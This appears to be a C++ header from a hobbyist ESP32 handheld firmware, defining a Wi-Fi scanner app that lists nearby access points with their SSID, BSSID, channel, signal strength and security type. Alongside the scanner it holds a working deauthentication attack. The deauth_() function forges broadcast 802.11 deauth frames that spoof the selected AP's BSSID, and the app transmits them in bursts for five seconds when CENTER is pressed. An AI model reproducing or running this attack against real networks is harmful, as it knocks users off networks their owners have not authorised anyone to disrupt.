#pragma once

#include "../app.h"
#include "../display.h"
#include "../ui.h"
#include "../log.h"

#include <WiFi.h>
#include <esp_wifi.h>

namespace flopper
{
    class WifiScanApp : public App
    {
    public:
        WifiScanApp() : App("WiFi Scan") {}

        void on_enter() override
        {
            WiFi.mode(WIFI_STA);
            WiFi.disconnect(true, true);
            esp_wifi_set_promiscuous(true);

            selected_ = 0;
            show_detail_ = false;
            last_scan_ms_ = 0;
            start_scan_();
            log::line("WIFI", "scan enter");
        }

        void on_exit() override
        {

            esp_wifi_set_promiscuous(false);
            WiFi.scanDelete();
            log::line("WIFI", "scan exit");
        }

        void tick() override
        {
            if (scan_in_flight_)
            {
                const int n = WiFi.scanComplete();
                if (n >= 0)
                    on_scan_done_(n);
                else if (n == WIFI_SCAN_FAILED)
                    scan_in_flight_ = false;
            }
            else
            {
                if (millis() - last_scan_ms_ > 15000)
                    start_scan_();
            }

            if (deauthing_)
            {
                if (millis() - deauth_start_ms_ < DEAUTH_DURATION_MS)
                {
                    deauth_(entries_[selected_]);
                }
                else
                {
                    deauthing_ = false;
                }
            }

            draw();
        }

        void draw() override
        {
            if (show_detail_)
            {
                draw_detail_();
                return;
            }

            const char *hdr = scan_in_flight_ ? "WiFi Scan (scanning...)" : "WiFi Scan (RIGHT=details)";
            flopper::ui::draw_status(Display::get_instance(), hdr);

            std::vector<const char *> items;
            lines_.clear();
            items.reserve(entries_count_);
            lines_.reserve(entries_count_);

            for (size_t i = 0; i < entries_count_; i++)
            {
                char buf[96];
                const auto &e = entries_[i];
                snprintf(buf, sizeof(buf), "%ddBm %s", e.rssi, e.ssid.c_str());
                lines_.push_back(buf);
                items.push_back(lines_.back().c_str());
            }

            if (items.empty())
                items.push_back("(no APs yet)");

            flopper::ui::draw_list(Display::get_instance(), items, flopper::ui::clamp_index(selected_, items.size()));
        }

        void on_input(InputEvent e) override
        {
            if (e == InputEvent::LEFT)
            {
                if (show_detail_)
                {
                    show_detail_ = false;
                    return;
                }
                exit();
                return;
            }

            if (e == InputEvent::CENTER)
            {
                if (show_detail_)
                {
                    start_scan_();
                    return;
                }
                else
                {
                    if (entries_count_)
                    {
                        deauthing_ = true;
                        deauth_start_ms_ = millis();
                    }
                    return;
                }
            }

            if (show_detail_)
            {

                return;
            }

            if (flopper::ui::apply_list_nav(e, selected_, entries_count_))
                return;
            if (e == InputEvent::RIGHT)
            {
                if (entries_count_)
                    show_detail_ = true;
                return;
            }
        }

    private:
        struct Entry
        {
            std::string ssid;
            std::string bssid;
            int rssi = 0;
            int channel = 0;
            wifi_auth_mode_t auth = WIFI_AUTH_OPEN;
        };

        static constexpr size_t kMaxEntries = 24;
        Entry entries_[kMaxEntries];
        size_t entries_count_ = 0;

        size_t selected_ = 0;
        bool show_detail_ = false;
        bool scan_in_flight_ = false;
        uint32_t last_scan_ms_ = 0;
        std::vector<std::string> lines_;

        static const char *auth_str_(wifi_auth_mode_t a)
        {
            switch (a)
            {
            case WIFI_AUTH_OPEN:
                return "OPEN";
            case WIFI_AUTH_WEP:
                return "WEP";
            case WIFI_AUTH_WPA_PSK:
                return "WPA";
            case WIFI_AUTH_WPA2_PSK:
                return "WPA2";
            case WIFI_AUTH_WPA_WPA2_PSK:
                return "WPA/WPA2";
            case WIFI_AUTH_WPA2_ENTERPRISE:
                return "WPA2-ENT";
#if defined(WIFI_AUTH_WPA3_PSK)
            case WIFI_AUTH_WPA3_PSK:
                return "WPA3";
#endif
#if defined(WIFI_AUTH_WPA2_WPA3_PSK)
            case WIFI_AUTH_WPA2_WPA3_PSK:
                return "WPA2/WPA3";
#endif
            default:
                return "?";
            }
        }

        void start_scan_()
        {
            if (scan_in_flight_)
                return;
            WiFi.scanDelete();
            entries_count_ = 0;
            selected_ = 0;
            show_detail_ = false;

            scan_in_flight_ = true;
            last_scan_ms_ = millis();

            // async scan; include hidden
            WiFi.scanNetworks(true, true);
            log::line("WIFI", "scan start");
        }

        void on_scan_done_(int n)
        {
            scan_in_flight_ = false;
            entries_count_ = 0;

            const int count = n > (int)kMaxEntries ? (int)kMaxEntries : n;
            for (int i = 0; i < count; i++)
            {
                Entry e;
                e.ssid = WiFi.SSID(i).c_str();
                e.bssid = WiFi.BSSIDstr(i).c_str();
                e.rssi = WiFi.RSSI(i);
                e.channel = WiFi.channel(i);
                e.auth = WiFi.encryptionType(i);
                entries_[entries_count_++] = e;

                log::printf("WIFI", "ap ssid='%s' bssid=%s ch=%d rssi=%d sec=%s",
                            e.ssid.c_str(), e.bssid.c_str(), e.channel, e.rssi, auth_str_(e.auth));
            }
            WiFi.scanDelete();
        }

        void draw_detail_()
        {
            if (!entries_count_)
            {
                show_detail_ = false;
                return;
            }

            const Entry &e = entries_[selected_ < entries_count_ ? selected_ : 0];

            char hdr[64];
            snprintf(hdr, sizeof(hdr), "WiFi: %s", e.ssid.size() ? e.ssid.c_str() : "(hidden)");
            flopper::ui::draw_status(Display::get_instance(), hdr);
            Display::get_instance().fill_rect(0, 30, 240, 210, TFT_BLACK);

            char line1[64];
            char line2[64];
            char line3[64];
            snprintf(line1, sizeof(line1), "BSSID: %s", e.bssid.c_str());
            snprintf(line2, sizeof(line2), "CH: %d  RSSI: %d", e.channel, e.rssi);
            snprintf(line3, sizeof(line3), "SEC: %s", auth_str_(e.auth));

            Display::get_instance().draw_text(flopper::ui::MARGIN_X, 40, line1, TFT_WHITE, 1, TFT_BLACK);
            Display::get_instance().draw_text(flopper::ui::MARGIN_X, 58, line2, TFT_WHITE, 1, TFT_BLACK);
            Display::get_instance().draw_text(flopper::ui::MARGIN_X, 76, line3, TFT_WHITE, 1, TFT_BLACK);
            Display::get_instance().draw_text(flopper::ui::MARGIN_X, 100, "LEFT=back", TFT_CYAN, 1, TFT_BLACK);
            Display::get_instance().draw_text(
                flopper::ui::MARGIN_X, 120,
                deauthing_ ? "DEAUTHING..." : "CENTER=deauth",
                deauthing_ ? TFT_CYAN : TFT_WHITE, 1, TFT_BLACK);
        }

    private:
        bool deauthing_ = false;
        uint32_t deauth_start_ms_ = 0;
        static constexpr uint32_t DEAUTH_DURATION_MS = 5000;

        void deauth_(const Entry &e)
        {

            uint8_t bssid[6];
            sscanf(e.bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                   &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);

            uint8_t frame[26] = {

                0xC0, 0x00,

                0x00, 0x00,

                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,

                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

                0x00, 0x00,
                0x07, 0x00};

            memcpy(frame + 10, bssid, 6);
            memcpy(frame + 16, bssid, 6);

            esp_wifi_set_channel(e.channel, WIFI_SECOND_CHAN_NONE);

            for (int i = 0; i < 10; i++)
            {
                esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
                delay(2);
            }

            log::printf("WIFI", "deauth bssid=%s ch=%d", e.bssid.c_str(), e.channel);
        }
    };
}
